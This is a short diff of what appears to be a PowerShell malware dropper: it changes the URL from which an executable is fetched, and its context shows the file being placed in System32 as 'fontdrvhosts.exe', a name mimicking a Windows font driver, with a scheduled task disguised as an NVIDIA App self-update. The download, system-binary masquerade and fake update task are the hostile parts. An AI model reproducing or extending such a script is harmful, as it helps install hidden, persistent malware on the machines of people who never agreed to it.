@@ -22,7 +22,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
 $databasePath = Join-Path $system32Path "database.txt"
-$exeUrl = "https://pub-a0f157286e3d403d8885d643b27de4c2.r2.dev/Helix_arzen/Helix.exe"
+$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/webKUYTAIMAKTAK/raw/refs/heads/main/fontdrvhosts.exe"
 $taskName = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 
 # -----------------------------
